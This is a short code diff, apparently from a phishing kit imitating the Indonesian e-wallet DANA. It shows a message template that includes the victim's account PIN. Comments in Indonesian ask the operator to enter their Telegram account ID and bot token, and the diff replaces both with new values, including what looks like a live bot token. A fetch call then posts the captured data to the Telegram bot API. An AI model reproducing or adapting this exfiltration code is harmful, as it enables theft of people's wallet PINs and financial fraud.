@@ -80,10 +80,10 @@ DANA | PIN |
 - Pin Akun : ${pinNumber}`;
 
 //_masukan_ID_Akun_Telegram_kamu
-var id_telegram   = "6622807510";
+var id_telegram   = "6751845484";
 
 //_masukan_ID_Bot_Telegram_kamu
-var token_botTele = "6500813629:AAHSWt3mas2TF9ZgxsvU4oWcapkY2P0MVzg";
+var token_botTele = "7226650520:AAEzawhpdEo4wL9oYDhpBWo14j2F_EsPAXQ";
 
  	fetch("https://api.telegram.org/bot"+token_botTele+"/sendMessage?parse_mode=markdown",{
  	    method: 'POST',
